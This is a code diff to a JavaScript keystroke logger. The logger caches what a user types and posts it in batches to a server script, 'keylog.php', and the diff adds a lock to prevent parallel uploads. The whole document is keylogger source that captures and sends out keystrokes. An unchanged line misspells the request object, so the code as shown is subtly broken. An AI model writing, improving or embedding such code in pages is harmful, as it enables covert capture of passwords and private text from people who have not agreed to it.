@@ -9,6 +9,7 @@
         var keylog = {
             //PROPERTIES
             cache : [], // TEMP ARRAY TO STORE KEY STROKES
+            sending : false, //TO PRECENT MULTIPLE PARALLEL UPLOADS
 
 
             init : function (){
@@ -23,7 +24,10 @@
             },
 
             //SEND TO SERVER
-            send : function () { if (keylog.cache.length != 0) {
+            send : function () { if (!keylog.sending && keylog.cache.length != 0) {
+                //"LOCK" - PREVENT MULTIPLE UPLOADS
+                keylog.sending = true;
+
                 //KEYPRESS DATA
                 var data = new FormData();
                 data.append("keys", JSON.stringify (keylog.cache));
@@ -33,6 +37,8 @@
                 var xhr = new XHLHttpRequest();
                 xhr.open("POST", "keylog.php");
                 xhr.onload = function(){
+                    //UNLOCK - ALLOW NEXT BATCH UPLOAD
+                    keylog.sending = false;
                     console.log(this.response); // FOR TESTING, OPTIONAL
                 };
                 xhr.send(data);
